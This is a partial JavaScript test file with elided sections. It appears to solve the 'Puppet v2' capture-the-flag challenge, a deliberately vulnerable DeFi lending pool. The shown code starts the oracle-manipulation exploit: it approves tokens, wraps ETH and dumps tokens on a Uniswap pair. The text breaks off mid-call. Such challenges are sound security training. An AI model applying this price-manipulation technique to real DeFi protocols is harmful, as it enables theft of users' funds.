...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ethers.utils.parseEther('1000000000'))
        
        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('19.8')});
        await this.weth.connect(attacker).approve(this.lendingPool.address, ethers.utils.parseEther('1000000000'))
        
        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 
        1,
        [this.token.address,
        this.weth.address],
        attacker.address,
